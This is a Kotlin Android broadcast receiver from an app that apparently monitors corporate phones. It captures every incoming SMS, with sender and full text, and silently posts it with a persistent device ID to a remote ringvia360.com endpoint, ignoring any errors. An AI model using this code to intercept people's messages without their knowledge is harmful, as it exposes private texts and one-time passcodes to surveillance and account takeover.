package com.ringvia360.phonewhtsapp.mobile_phone_whatsapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID

class SmsBroadcastReceiver : BroadcastReceiver() {

    companion object {
        const val BASE_URL = "https://ringvia360.com/api/phone_whatsapp.php"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages.isNullOrEmpty()) return

        val fullBody = StringBuilder()
        var sender = ""
        var timestampMs = System.currentTimeMillis()

        for (sms in messages) {
            if (sender.isEmpty()) {
                sender = sms.displayOriginatingAddress ?: sms.originatingAddress ?: ""
                timestampMs = sms.timestampMillis
            }
            fullBody.append(sms.displayMessageBody ?: sms.messageBody ?: "")
        }

        val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
        val timestamp = isoFormat.format(Date(timestampMs))
        val id = "sms_" + timestampMs + "_" + UUID.randomUUID().toString().substring(0, 4)

        val event = mapOf(
            "id" to id,
            "type" to "sms",
            "direction" to "inbound",
            "sender" to (if (sender.isNotEmpty()) sender else "Unknown Sender"),
            "recipient" to "Device",
            "messageBody" to fullBody.toString(),
            "simSlot" to "SIM 1 (Corporate)",
            "timestamp" to timestamp
        )

        TelemetryBridgeChannel.sendTelemetryEvent(event)

        // Asynchronously post directly to server in background thread via goAsync()
        val pendingResult = goAsync()
        Thread {
            try {
                val devicePrefs = context.getSharedPreferences("ringvia_prefs", Context.MODE_PRIVATE)
                var deviceId = devicePrefs.getString("device_unique_id", null)
                if (deviceId == null) {
                    val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                    deviceId = if (!androidId.isNullOrEmpty()) "dev_$androidId" else "dev_" + UUID.randomUUID().toString().substring(0, 8)
                    devicePrefs.edit().putString("device_unique_id", deviceId).apply()
                }

                val url = URL("$BASE_URL?action=sms")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                val json = JSONObject().apply {
                    put("id", id)
                    put("deviceId", deviceId)
                    put("direction", "inbound")
                    put("sender", if (sender.isNotEmpty()) sender else "Unknown Sender")
                    put("recipient", "Device")
                    put("messageBody", fullBody.toString())
                    put("simSlot", "SIM 1 (Corporate)")
                    put("timestamp", timestamp)
                    put("syncStatus", "SYNCED")
                }

                OutputStreamWriter(conn.outputStream).use {
                    it.write(json.toString())
                    it.flush()
                }
                conn.responseCode
            } catch (_: Exception) {
            } finally {
                pendingResult.finish()
            }
        }.start()
    }
}
